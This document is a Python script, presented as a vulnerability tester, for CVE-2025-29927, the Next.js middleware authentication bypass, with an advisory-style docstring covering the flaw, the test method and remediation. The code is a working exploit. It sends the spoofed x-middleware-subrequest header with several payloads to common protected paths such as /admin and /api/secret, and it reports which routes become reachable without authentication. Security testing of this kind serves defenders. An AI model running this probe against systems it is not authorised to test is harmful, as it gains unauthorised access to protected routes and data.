#!/usr/bin/env python3
"""
CVE-2025-29927 — Next.js Middleware Authentication Bypass
=========================================================

CVE ID      : CVE-2025-29927
GHSA        : GHSA-f82v-jwr5-mffw
CVSS Score  : 9.1 (CRITICAL)
CVSS Vector : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
Affected    : Next.js >= 11.1.4, < 14.2.25  (also 15.x < 15.2.3)
Patched     : 14.2.25, 15.2.3
Published   : 2025-03-19
Researcher  : zhero___ & inzo_ (independent disclosure)

Description
-----------
Next.js uses an internal HTTP header `x-middleware-subrequest` to track recursive
middleware invocations and prevent infinite loops. When this header is present and
its value matches the middleware's own name (or a colon-separated path that includes
it), the middleware execution is **skipped entirely** — the request is forwarded
directly to the origin handler without running any middleware code.

An external attacker can send this header with an arbitrary value (e.g.,
`middleware`, `middleware:middleware:middleware`) in any HTTP request. Because
Next.js does not validate that the header was set by a trusted internal source,
all middleware-based auth checks, redirects, and access controls are bypassed.

Attack Surface
--------------
Any route protected *only* by Next.js middleware:
  - Auth gates (redirect to /login if no session cookie)
  - Role-based access control in middleware
  - IP allowlisting in middleware
  - Rate limiting in middleware
  - Tenant isolation in middleware

Routes protected by server-side auth checks (getServerSideProps, Route Handler
auth logic, database session validation) are NOT affected by this CVE.

Test Methodology
----------------
1. Identify a route that middleware should protect (e.g. /dashboard, /admin,
   /api/secret). Expect a redirect (3xx) or 401/403 without auth.
2. Send the same request WITH the bypass header.
3. If the response changes from redirect/401/403 to 200, middleware was bypassed.

The test probes four candidate protected paths and tries three header payloads:
  - "middleware"
  - "middleware:middleware:middleware"
  - "pages/_middleware"

Remediation
-----------
Upgrade Next.js to >= 14.2.25 (or >= 15.2.3 for v15).
If upgrade is not immediately possible:
  - Block the `x-middleware-subrequest` header at your reverse proxy / CDN
    before it reaches the Next.js server.
  - Example Nginx: proxy_set_header x-middleware-subrequest "";
  - Example Cloudflare Rule: remove header on incoming requests.

References
----------
- https://github.com/advisories/GHSA-f82v-jwr5-mffw
- https://nvd.nist.gov/vuln/detail/CVE-2025-29927
- https://nextjs.org/blog/cve-2025-29927
"""

from __future__ import annotations

import argparse
import sys
import urllib.error
import urllib.request
from typing import NamedTuple

BYPASS_HEADER = "x-middleware-subrequest"
BYPASS_PAYLOADS = [
    "middleware",
    "middleware:middleware:middleware",
    "pages/_middleware",
    "src/middleware",
]

# Common paths that are typically protected by middleware auth gates.
CANDIDATE_PATHS = [
    "/dashboard",
    "/admin",
    "/api/secret",
    "/api/admin",
    "/account",
    "/profile",
    "/settings",
    "/private",
]


class ProbeResult(NamedTuple):
    path: str
    baseline_status: int
    bypass_status: int
    payload: str
    bypassed: bool


def fetch_status(url: str, extra_headers: dict[str, str] | None = None, timeout: int = 10) -> int:
    """Return HTTP status code; follow up to one redirect manually to catch soft-redirects."""
    headers = {
        "User-Agent": "NextJS-CVE-Tester/1.0 (security research)",
        "Accept": "text/html,application/json,*/*",
    }
    if extra_headers:
        headers.update(extra_headers)
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status
    except urllib.error.HTTPError as exc:
        return exc.code
    except urllib.error.URLError as exc:
        raise ConnectionError(str(exc)) from exc


def probe(target: str, path: str, payload: str, timeout: int) -> tuple[int, int]:
    url = target.rstrip("/") + path
    baseline = fetch_status(url, timeout=timeout)
    bypassed = fetch_status(url, extra_headers={BYPASS_HEADER: payload}, timeout=timeout)
    return baseline, bypassed


def is_protected(status: int) -> bool:
    """True if status suggests middleware is blocking the request."""
    return status in {301, 302, 303, 307, 308, 401, 403}


def is_accessible(status: int) -> bool:
    return status in {200, 204}


def run(target: str, timeout: int, verbose: bool) -> int:
    print(f"\n[CVE-2025-29927] Next.js Middleware Auth Bypass")
    print(f"Target : {target}")
    print(f"Header : {BYPASS_HEADER}")
    print("-" * 60)

    results: list[ProbeResult] = []

    for path in CANDIDATE_PATHS:
        for payload in BYPASS_PAYLOADS:
            try:
                baseline, bypass = probe(target, path, payload, timeout)
            except ConnectionError as exc:
                if verbose:
                    print(f"  {path}  [connection error: {exc}]")
                continue

            bypassed = is_protected(baseline) and is_accessible(bypass)
            results.append(ProbeResult(path, baseline, bypass, payload, bypassed))

            flag = "*** BYPASSED ***" if bypassed else ""
            if verbose or bypassed:
                print(f"  {path:<20} baseline={baseline}  bypass={bypass}  payload={payload!r}  {flag}")

            if bypassed:
                # Found one — no need to try more payloads for this path.
                break

    print()
    bypassed_paths = [r for r in results if r.bypassed]
    protected_paths = [r for r in results if is_protected(r.baseline_status)]
    inconclusive = not protected_paths

    if bypassed_paths:
        print("VERDICT : VULNERABLE")
        print()
        print("Bypassed paths:")
        for r in bypassed_paths:
            print(f"  {r.path}  (baseline={r.baseline_status} → bypass={r.bypass_status}  header={r.payload!r})")
        print()
        print("Impact  : An unauthenticated attacker can access these protected routes")
        print("          by including the x-middleware-subrequest header in any request.")
        print("Fix     : Upgrade Next.js to >= 14.2.25")
        return 1
    elif inconclusive:
        print("VERDICT : INCONCLUSIVE")
        print()
        print("No candidate paths returned a protected status code (3xx / 401 / 403).")
        print("Either the target has no middleware-protected routes, or all routes")
        print("tested are publicly accessible. Try specifying a known-protected path")
        print("manually and re-run with --verbose.")
        return 2
    else:
        print("VERDICT : PATCHED (or not exploitable via tested paths)")
        print()
        print(f"Tested {len(protected_paths)} protected path(s). None returned 200 with bypass header.")
        print("The server may have been upgraded, or the CDN strips the bypass header.")
        return 0


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[1].strip())
    parser.add_argument("--target", default="http://localhost:3000", help="Base URL of the Next.js app")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--verbose", "-v", action="store_true", help="Print all probe results")
    args = parser.parse_args()
    return run(args.target, args.timeout, args.verbose)


if __name__ == "__main__":
    raise SystemExit(main())
